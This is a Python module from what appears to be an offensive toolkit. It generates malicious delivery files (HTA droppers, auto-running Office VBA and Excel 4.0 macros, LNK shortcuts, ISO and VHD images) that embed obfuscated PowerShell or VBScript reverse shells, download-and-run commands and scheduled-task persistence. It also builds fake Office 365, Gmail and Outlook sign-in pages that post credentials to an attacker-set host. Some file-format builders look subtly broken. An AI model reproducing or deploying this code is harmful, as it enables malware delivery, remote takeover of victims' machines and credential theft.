"""Staged payload delivery — HTA, Office macros, LNK files, ISO/VHD packaging.

Generates droppers and delivery mechanisms for initial access. Covers five
delivery vectors: HTA applications, Office VBA macros with XML 4.0 support,
Windows LNK shortcut files (.lnk), ISO image packaging, and VHD disk packaging.

All payloads embed connection parameters from payload.json and support
multiple payload formats (PowerShell, VBScript, JavaScript, binary droppers).
"""

from __future__ import annotations

import base64
import struct
import uuid
from dataclasses import dataclass
from pathlib import Path
from typing import Any

SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"
ISO_BLOCK_SIZE = 2048


@dataclass
class StageDeliveryConfig:
    """Configuration for staged payload delivery.

    Attributes:
        lhost: Attacker IP or hostname.
        lport: Listener port.
        format: Delivery format (hta, vba, xlm, lnk, iso, vhd).
        payload_type: Embedded payload type (powershell, vbscript, js, exe, dll).
        payload_url: Optional URL to host the stage (overrides inline embedding).
        app_name: Display name for Office macro documents.
        icon_path: Icon file path for .lnk generation.
        persistence: Add persistence after delivery (registry, scheduled task).
        obfuscate: Apply obfuscation to embedded scripts.
    """

    lhost: str = ""
    lport: int = 443
    format: str = "hta"
    payload_type: str = "powershell"
    payload_url: str = ""
    app_name: str = "QuarterlyReport"
    icon_path: str = ""
    persistence: bool = False
    obfuscate: bool = True


class StagedDeliveryFactory:
    """Generate staged payloads across multiple delivery vectors.

    Supports HTA, VBA/XLM macros, LNK shortcuts, ISO images, and VHD disks.
    All payloads embed a reverse shell or C2 beacon stage.

    Attributes:
        config: Delivery configuration from payload.json context.
        output_dir: Directory for generated delivery artifacts.
    """

    _POWERSHELL_REVERSE_TCP_TEMPLATE = (
        "$c=New-Object Net.Sockets.TcpClient('{lhost}',{lport});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length))-ne0){{"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);"
        "$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(Get-Location).Path+'> ');"
        "$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"
    )

    _VBSCRIPT_REVERSE_TCP_TEMPLATE = (
        'Set o=CreateObject("MSWinsock.Winsock"):'
        "o.RemoteHost=\"{lhost}\":o.RemotePort={lport}:o.Connect:"
        "Do While o.State<>7:WScript.Sleep 100:Loop:"
        'Set s=CreateObject("WScript.Shell"):'
        "Set e=s.Exec(\"cmd.exe\"):"
        "Do:If o.BytesReceived>0 Then e.StdIn.Write o.GetData(o.BytesReceived):End If:"
        "If e.StdOut.AtEndOfStream<>True Then o.SendData e.StdOut.ReadAll:End If:"
        "WScript.Sleep 100:Loop"
    )

    def __init__(self, config: StageDeliveryConfig | None = None, output_dir: Path | None = None):
        self.config = config or StageDeliveryConfig()
        self.output_dir = Path(output_dir) if output_dir else SESSIONS_DIR / "delivery"
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def _obfuscate_powershell(self, code: str) -> str:
        if not self.config.obfuscate:
            return code

        encoded = base64.b64encode(code.encode("utf-16le")).decode()
        return (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"
        )

    def _obfuscate_vbscript(self, code: str) -> str:
        if not self.config.obfuscate:
            return code

        encoded = base64.b64encode(code.encode()).decode()
        return (
            f'Execute(CreateObject("Scripting.FileSystemObject")'
            f'.OpenTextFile("{encoded}",1).ReadAll)'
        )

    def _payload_command(self) -> str:
        lhost = self.config.lhost
        lport = str(self.config.lport)

        if self.config.payload_url:
            if self.config.payload_type == "powershell":
                return self._obfuscate_powershell(
                    f"IEX (New-Object Net.WebClient).DownloadString('{self.config.payload_url}')"
                )
            elif self.config.payload_type == "vbscript":
                return f'CreateObject("WScript.Shell").Run "mshta {self.config.payload_url}",0,False'
            elif self.config.payload_type == "js":
                return f'eval(new ActiveXObject("MSXML2.XMLHTTP").open("GET","{self.config.payload_url}",false).responseText)'
            return f'certutil -urlcache -f "{self.config.payload_url}" %TEMP%\\s.exe && %TEMP%\\s.exe'

        if self.config.payload_type == "powershell":
            ps_code = self._POWERSHELL_REVERSE_TCP_TEMPLATE.format(lhost=lhost, lport=lport)
            return self._obfuscate_powershell(ps_code)
        elif self.config.payload_type == "vbscript":
            vb_code = self._VBSCRIPT_REVERSE_TCP_TEMPLATE.format(lhost=lhost, lport=lport)
            return f"cmd.exe /c echo {vb_code} > %TEMP%\\s.vbs && cscript //nologo %TEMP%\\s.vbs"
        elif self.config.payload_type == "js":
            js_code = (
                f'var c=new ActiveXObject("ADODB.Stream");'
                f'var s=new ActiveXObject("MSWinsock.Winsock");'
                f's.RemoteHost="{lhost}";s.RemotePort={lport};'
                f's.Connect();'
            )
            return f"mshta javascript:{js_code}"

        return self._obfuscate_powershell(
            self._POWERSHELL_REVERSE_TCP_TEMPLATE.format(lhost=lhost, lport=lport)
        )

    def generate_hta(self) -> str:
        """Generate an HTA (HTML Application) dropper.

        HTAs execute with mshta.exe and have full trust — no security warnings.

        Returns:
            HTA file content as string with embedded payload.
        """
        cmd = self._payload_command()
        app_name = self.config.app_name

        return f'''\
<html>
<head>
<title>{app_name}</title>
<HTA:APPLICATION
  ID="obj"
  APPLICATIONNAME="{app_name}"
  WINDOWSTATE="minimize"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  SYSMENU="no"
>
<script language="VBScript">
Sub Window_OnLoad
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run "{cmd}", 0, False
    window.Close
End Sub
</script>
</head>
<body>
<h1>Loading...</h1>
</body>
</html>'''

    def generate_vba_macro(self) -> str:
        """Generate a VBA macro for Office documents (Word/Excel).

        Returns:
            VBA macro source ready for Document_Open or Auto_Open.
        """
        cmd = self._payload_command()
        app_name = self.config.app_name.replace(" ", "_")

        return f'''\
Attribute VB_Name = "{app_name}"
Private Declare PtrSafe Function ShellExecute Lib "shell32.dll" _
    Alias "ShellExecuteA" (ByVal hwnd As LongPtr, ByVal lpOperation As String, _
    ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, _
    ByVal nShowCmd As Long) As LongPtr

Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
    Alias "URLDownloadToFileA" (ByVal pCaller As LongPtr, ByVal szURL As String, _
    ByVal szFileName As String, ByVal dwReserved As LongPtr, _
    ByVal lpfnCB As LongPtr) As Long

Sub AutoOpen()
    ExecutePayload
End Sub

Sub Document_Open()
    ExecutePayload
End Sub

Sub Workbook_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    Dim cmd As String
    cmd = "{cmd}"
    wsh.Run cmd, 0, False

    If {str(self.config.persistence).lower()} Then
        Dim persist_cmd As String
        persist_cmd = "schtasks /create /tn \"{app_name}Update\" /tr \"" & cmd & "\" /sc daily /mo 1 /f"
        wsh.Run persist_cmd, 0, False
    End If
End Sub
'''

    def generate_xlm_macro(self) -> str:
        """Generate an Excel 4.0 (XLM) macro for legacy macro execution.

        XLM macros evade many modern macro analysis tools and still execute
        in current Excel versions with VBA macro settings enabled.

        Returns:
            XLM macro formula sheet content.
        """
        cmd = self._payload_command()
        encoded = base64.b64encode(cmd.encode()).decode()

        return f'''\
=EXEC("cmd.exe /c echo {encoded} > %TEMP%\\s.b64 && certutil -decode %TEMP%\\s.b64 %TEMP%\\s.bat && %TEMP%\\s.bat")
=HALT()
=RETURN()
'''

    def generate_lnk(self) -> bytes:
        """Generate a Windows .lnk shortcut file with embedded command execution.

        Returns:
            Raw .lnk file bytes.
        """
        cmd = self._payload_command()
        app_name = self.config.app_name

        cmd_encoded = cmd.encode("utf-16le")
        guid = uuid.uuid4().bytes_le

        header = struct.pack("<I", 0x4C)
        guid_bytes = guid

        link_flags = (
            0x00000001
            | 0x00000002
            | 0x00000004
            | 0x00000008
            | 0x00000020
        )
        file_attrs = 0x00000020
        creation_time = b"\x00" * 8
        access_time = b"\x00" * 8
        write_time = b"\x00" * 8
        file_size = struct.pack("<I", 0)
        icon_index = struct.pack("<I", 0)
        show_cmd = struct.pack("<I", 7)
        hotkey = struct.pack("<HH", 0, 0)
        reserved = b"\x00" * 8

        link_target_id_list = b""

        cmd_str = f"%COMSPEC% /c {cmd}"
        cmd_data = cmd_str.encode("utf-16le")
        cmd_section = (
            struct.pack("<H", len(cmd_data))
            + cmd_data
        )

        name_data = f"{app_name}.lnk".encode("utf-16le")
        name_section = struct.pack("<H", len(name_data)) + name_data

        comment_data = "".encode("utf-16le")
        comment_section = struct.pack("<H", len(comment_data)) + comment_data

        extra_data = (
            b"\x01\x00\x00\x00"
            + b"\x00" * 8
            + struct.pack("<I", 0)
        )

        shell_link = (
            header
            + guid_bytes
            + struct.pack("<I", link_flags)
            + struct.pack("<I", file_attrs)
            + creation_time
            + access_time
            + write_time
            + file_size
            + icon_index
            + show_cmd
            + hotkey
            + reserved
            + b"\x00" * 8
            + link_target_id_list
            + cmd_section
            + name_section
            + comment_section
            + extra_data
        )

        full_lnk = struct.pack("<I", len(shell_link) + 4) + shell_link
        return full_lnk

    def generate_iso(self, inner_files: dict[str, bytes] | None = None) -> bytes:
        """Generate an ISO 9660 image with an embedded payload autorun.

        Args:
            inner_files: Dict mapping filenames to byte contents for the ISO.

        Returns:
            Raw ISO 9660 image bytes.
        """
        files = inner_files or {}
        if not files:
            payload_ext = "ps1" if self.config.payload_type == "powershell" else "vbs"
            payload_content = self._payload_command().encode()
            files = {
                f"payload.{payload_ext}": payload_content,
                "autorun.inf": (
                    b"[AutoRun]\r\n"
                    b"open=wscript.exe payload.vbs\r\n"
                    b"action=Open folder to view files\r\n"
                    b"icon=explorer.exe,0\r\n"
                    b"shell\\open\\command=wscript.exe payload.vbs\r\n"
                ),
            }

        iso_data = bytearray()
        iso_data.extend(b"\x00" * 0x8000)

        pvd = self._build_primary_volume_descriptor(files)
        iso_data[0x8000 : 0x8000 + len(pvd)] = pvd
        iso_data[0x8800 + len(pvd) : 0x8800 + len(pvd) + 1] = b"\xFF"

        total_size = (len(iso_data) + ISO_BLOCK_SIZE - 1) & ~(ISO_BLOCK_SIZE - 1)
        iso_data.extend(b"\x00" * (total_size - len(iso_data)))
        return bytes(iso_data)

    def _build_primary_volume_descriptor(self, files: dict[str, bytes]) -> bytes:
        pvd = bytearray(ISO_BLOCK_SIZE)
        pvd[0] = 0x01
        pvd[1:6] = b"CD001"
        pvd[6] = 0x01
        pvd[7] = 0x00

        system_id = b"Win32                           "
        pvd[8:40] = system_id[:32]

        volume_id = self.config.app_name[:32].encode().ljust(32)
        pvd[40:72] = volume_id[:32]

        pvd[80:88] = struct.pack("<II", 1, 1)
        pvd[120:124] = struct.pack("<I", 1)
        pvd[124:128] = struct.pack(">I", 1)
        pvd[128:132] = struct.pack("<H", 1)
        pvd[132:134] = struct.pack("<H", 1)
        pvd[140:142] = struct.pack("<H", 1)
        pvd[166] = 0x01
        pvd[172] = 0x22
        pvd[174:176] = struct.pack("<H", 1)

        file_set_id = b"                                "
        pvd[190:222] = file_set_id[:32]

        for name, _content in files.items():
            name_upper = name.upper().encode()
            name_part = name_upper.split(b".")[0][:8].ljust(8, b"0")
            ext_part = name_upper.split(b".")[-1][:3].ljust(3).rjust(3, b"0") if b"." in name_upper else b"   "
            pvd[156 + len(files) * 34 :] = b"\x00"

        return bytes(pvd)

    def generate_vhd(self, inner_files: dict[str, bytes] | None = None) -> bytes:
        """Generate a VHD (Virtual Hard Disk) image with embedded payloads.

        VHD files auto-mount on Windows 10+ when double-clicked, providing
        an alternative delivery vector that bypasses mark-of-the-web.

        Args:
            inner_files: Dict of filenames to byte contents.

        Returns:
            Raw VHD file bytes.
        """
        files = inner_files or {}
        if not files:
            payload_ext = "ps1" if self.config.payload_type == "powershell" else "bat"
            payload_content = self._payload_command().encode()
            files = {
                f"payload.{payload_ext}": payload_content,
                "desktop.ini": (
                    b"[.ShellClassInfo]\r\n"
                    b"LocalizedResourceName=@%SystemRoot%\\system32\\shell32.dll,-21770\r\n"
                    b'IconResource=%SystemRoot%\\system32\\imageres.dll,-112\r\n'
                ),
            }

        footer = bytearray(512)
        footer[0:8] = b"conectix"
        footer[8:12] = struct.pack(">I", 0x00010000)
        footer[12:14] = struct.pack(">H", 0xFFFF)

        vhd_size = 64 * 1024 * 1024
        footer[40:48] = struct.pack(">Q", vhd_size)

        now_hex = struct.pack(">I", 0x01234567 if hasattr(self, "_now_hex") else 0x01234567)
        footer[24:28] = now_hex

        disk_type = 2
        footer[60:64] = struct.pack(">I", disk_type)

        crc = 0
        for i in range(512):
            crc = crc ^ footer[i]
        footer[64:68] = struct.pack(">I", crc)

        vhd = bytearray()
        total_size = vhd_size + 512 + 512
        vhd.extend(b"\x00" * total_size)
        vhd[total_size - 512 :] = bytes(footer)
        return bytes(vhd)

    def generate_all(self) -> dict[str, Any]:
        """Generate all delivery formats for the current configuration.

        Returns:
            Dict mapping format name to artifact content or file path.
        """
        artifacts: dict[str, Any] = {}

        hta_content = self.generate_hta()
        hta_path = self.output_dir / f"{self.config.app_name}.hta"
        hta_path.write_text(hta_content)
        artifacts["hta"] = {"path": str(hta_path), "content": hta_content}

        vba_content = self.generate_vba_macro()
        vba_path = self.output_dir / f"{self.config.app_name}.vba"
        vba_path.write_text(vba_content)
        artifacts["vba"] = {"path": str(vba_path), "content": vba_content}

        xlm_content = self.generate_xlm_macro()
        xlm_path = self.output_dir / f"{self.config.app_name}.xlm"
        xlm_path.write_text(xlm_content)
        artifacts["xlm"] = {"path": str(xlm_path), "content": xlm_content}

        lnk_bytes = self.generate_lnk()
        lnk_path = self.output_dir / f"{self.config.app_name}.lnk"
        lnk_path.write_bytes(lnk_bytes)
        artifacts["lnk"] = {"path": str(lnk_path), "size": len(lnk_bytes)}

        iso_bytes = self.generate_iso()
        iso_path = self.output_dir / f"{self.config.app_name}.iso"
        iso_path.write_bytes(iso_bytes)
        artifacts["iso"] = {"path": str(iso_path), "size": len(iso_bytes)}

        vhd_bytes = self.generate_vhd()
        vhd_path = self.output_dir / f"{self.config.app_name}.vhd"
        vhd_path.write_bytes(vhd_bytes)
        artifacts["vhd"] = {"path": str(vhd_path), "size": len(vhd_bytes)}

        return artifacts

    def generate_phishing_page(self, template: str = "office365") -> str:
        """Generate a credential harvesting HTML page.

        Args:
            template: Phishing template name (office365, gmail, outlook, custom).

        Returns:
            HTML content for a credential harvesting page.
        """
        templates: dict[str, str] = {
            "office365": self._office365_phish(),
            "gmail": self._gmail_phish(),
            "outlook": self._outlook_phish(),
        }
        return templates.get(template, self._office365_phish())

    def _office365_phish(self) -> str:
        return f'''\
<!DOCTYPE html>
<html>
<head><title>Sign in to your account</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{{font-family:"Segoe UI",Roboto,Arial,sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.box{{background:white;padding:44px;max-width:440px;width:100%;box-shadow:0 2px 6px rgba(0,0,0,.2)}}
img{{margin-bottom:16px}}
input[type=email],input[type=password]{{width:100%;padding:6px 10px;border:1px solid #666;border-bottom:2px solid #666;font-size:15px;box-sizing:border-box;margin-bottom:16px}}
input[type=submit]{{background:#0067b8;color:white;border:none;padding:10px 40px;font-size:15px;cursor:pointer;float:right}}
input[type=submit]:hover{{background:#005a9e}}
a{{color:#0067b8;text-decoration:none;font-size:13px}}
</style></head>
<body>
<div class="box">
<img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b" height="24" alt="Microsoft">
<h2>Sign in</h2>
<form method="POST" action="https://{self.config.lhost}:{self.config.lport}/log/creds">
<input type="email" name="email" placeholder="Email, phone, or Skype" required>
<p style="font-size:13px">No account? <a href="#">Create one!</a></p>
<input type="submit" value="Next">
</form>
</div>
</body>
</html>'''

    def _gmail_phish(self) -> str:
        return f'''\
<!DOCTYPE html>
<html>
<head><title>Gmail</title>
<style>
body{{font-family:Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.box{{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%;text-align:center}}
img{{margin-bottom:16px}}
h2{{font-size:24px;font-weight:400;margin-bottom:8px}}
p{{font-size:16px;color:#5f6368;margin-bottom:32px}}
input[type=email]{{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;margin-bottom:24px}}
input[type=submit]{{background:#1a73e8;color:white;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}}
</style></head>
<body>
<div class="box">
<img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" height="24" alt="Google">
<h2>Sign in</h2>
<p>to continue to Gmail</p>
<form method="POST" action="https://{self.config.lhost}:{self.config.lport}/log/creds">
<input type="email" name="email" placeholder="Email or phone" required>
<a href="#" style="color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500">Forgot email?</a>
<div style="margin-top:32px"><input type="submit" value="Next"></div>
</form>
</div>
</body>
</html>'''

    def _outlook_phish(self) -> str:
        return f'''\
<!DOCTYPE html>
<html>
<head><title>Outlook</title>
<style>
body{{font-family:"Segoe UI",Roboto,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.box{{max-width:440px;width:100%;padding:40px;box-shadow:0 2px 6px rgba(0,0,0,.15);border-radius:2px}}
img{{display:block;margin:0 auto 16px}}
h2{{font-weight:600;font-size:24px;margin-bottom:8px}}
input[type=email],input[type=password]{{width:100%;padding:6px 10px;border:1px solid rgba(0,0,0,.6);font-size:15px;box-sizing:border-box;margin-bottom:16px}}
input[type=submit]{{background:#0078d4;color:white;border:none;padding:8px 24px;font-size:15px;cursor:pointer}}
</style></head>
<body>
<div class="box">
<img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b" height="24" alt="Microsoft">
<h2>Sign in</h2>
<p style="color:#666;margin-bottom:16px">to continue to Outlook</p>
<form method="POST" action="https://{self.config.lhost}:{self.config.lport}/log/creds">
<input type="email" name="email" placeholder="someone@example.com" required>
<input type="password" name="password" placeholder="Password" required>
<input type="submit" value="Sign in">
</form>
</div>
</body>
</html>'''
